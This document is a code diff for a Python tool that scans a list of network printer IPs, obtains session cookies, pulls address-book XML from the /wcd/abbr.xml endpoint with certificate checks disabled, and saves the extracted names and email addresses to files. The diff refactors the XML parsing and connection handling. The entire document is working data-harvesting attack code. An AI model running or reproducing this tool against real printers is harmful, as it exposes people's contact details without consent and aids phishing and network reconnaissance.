@@ -3,7 +3,6 @@ import argparse
 import requests
 import xml.etree.ElementTree as ET
 import os
-import re
 
 # Suppress SSL warnings
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
@@ -39,8 +38,7 @@ def get_cookie(ip, use_https=False, debug=False):
             print(f"[DEBUG] Failed to reach {protocol}://{ip}: {e}")
         return None, None
 
-
-def get_address_book(ip, cookie, protocol, start=1, end=50, debug=False):
+def get_address_book(ip, cookie, protocol, debug=False):
     """Request the address book XML using the same protocol that worked for the cookie request."""
     url = f"{protocol}://{ip}/wcd/abbr.xml"
     headers = {'Cookie': cookie}
@@ -49,9 +47,10 @@ def get_address_book(ip, cookie, protocol, start=1, end=50, debug=False):
         response = requests.get(url, headers=headers, timeout=5, verify=False)
         response.raise_for_status()
 
+        # Ensure response is XML
         if "<html" in response.text[:100].lower():
             if debug:
-                print(f"[DEBUG] Received unexpected HTML from {url}, likely a failure.")
+                print(f"[DEBUG] Received unexpected HTML from {url}. Likely an error.")
                 print(f"[DEBUG] Response snippet:\n{response.text[:500]}")
             return None
 
@@ -62,55 +61,46 @@ def get_address_book(ip, cookie, protocol, start=1, end=50, debug=False):
         return response.text
 
     except requests.exceptions.ConnectionError:
-        if protocol == "http":
-            print(f"[!] Connection failed retrieving XML from {ip} over HTTP, retrying with HTTPS...")
-            return get_address_book(ip, cookie, "https", start, end, debug=debug)
-        else:
-            print(f"[X] Connection failed retrieving XML from {ip} over HTTPS, skipping...")
-            return None
+        print(f"[X] Connection failed retrieving XML from {ip} over {protocol}, skipping...")
+        return None
     except requests.exceptions.RequestException as e:
         if debug:
             print(f"[DEBUG] Failed to retrieve XML from {protocol}://{ip}: {e}")
         return None
 
-
 def parse_xml(xml_data, ip, debug=False):
-    """Extract Name and Email from XML response, ensuring data is within <MFP> → <Setting> → <Address> → <AbbrList> → <Abbr>."""
+    """Extract Name and Email from XML response, ensuring data is within <Address> → <AbbrList> → <AddressKind>."""
     parsed_data = []
     
     try:
         root = ET.fromstring(xml_data)
 
-        # Locate <MFP> → <Setting> → <Address> → <AbbrList>
-        address_block = root.find(".//MFP/Setting/Address/AbbrList")
-        if address_block is None:
+        # Find the first <Address> block in the XML
+        address_blocks = root.findall(".//Address")
+        if not address_blocks:
             if debug:
-                print(f"[DEBUG] No <AbbrList> tag found inside <MFP>/Setting/Address for {ip}.")
-                print(f"[DEBUG] First 500 chars of response:\n{xml_data[:500]}")
+                print(f"[DEBUG] No <Address> tag found for {ip}. Full response:\n{xml_data[:500]}")
             return []
 
-        # Check if multiple pages are needed
-        range_text = address_block.find("Range").text if address_block.find("Range") is not None else ""
-        match = re.search(r"(\d+)-(\d+)", range_text)
-        if match:
-            start, end = map(int, match.groups())
-            if debug:
-                print(f"[DEBUG] Address book contains range {start}-{end}. There may be more pages!")
+        for address in address_blocks:
+            abbr_list = address.find("AbbrList")
+            if abbr_list is None:
+                continue  # Skip if no <AbbrList> found
 
-        for addr in address_block.findall(".//Abbr"):
-            name_element = addr.find("Name")
-            name = name_element.text.strip() if name_element is not None else "Unknown"
+            for addr in abbr_list.findall("AddressKind"):
+                name_element = addr.find("Name")
+                name = name_element.text.strip() if name_element is not None else "Unknown"
 
-            send_config = addr.find("SendConfiguration")
-            email = "No Email"
-            if send_config is not None:
-                to_element = send_config.find("To")
-                email = to_element.text.strip() if to_element is not None else "No Email"
+                send_config = addr.find("SendConfiguration")
+                email = "No Email"
+                if send_config is not None:
+                    to_element = send_config.find("To")
+                    email = to_element.text.strip() if to_element is not None else "No Email"
 
-            parsed_data.append((name, email))
+                parsed_data.append((name, email))
 
-            if debug:
-                print(f"[DEBUG] Extracted Name: {name}, Email: {email}")
+                if debug:
+                    print(f"[DEBUG] Extracted Name: {name}, Email: {email}")
 
         return parsed_data
 
@@ -118,7 +108,6 @@ def parse_xml(xml_data, ip, debug=False):
         if debug:
             print(f"[DEBUG] Error parsing XML from {ip}: {e}")
         return []
-
 
 def process_ip(ip, output_file, debug=False):
     """Handles the full process for a single IP."""
@@ -140,7 +129,6 @@ def process_ip(ip, output_file, debug=False):
     else:
         print(f"[!] No valid records found for {ip}")
 
-
 def main():
     parser = argparse.ArgumentParser(description="Extract internal address books from network printers.")
     parser.add_argument("-i", "--input", help="File containing list of printer IPs", required=True)
@@ -158,7 +146,6 @@ def main():
     for ip in ips:
         output_file = f"{ip}_addrbook.txt"
         process_ip(ip, output_file, debug=args.debug)
-
 
 if __name__ == "__main__":
     main()
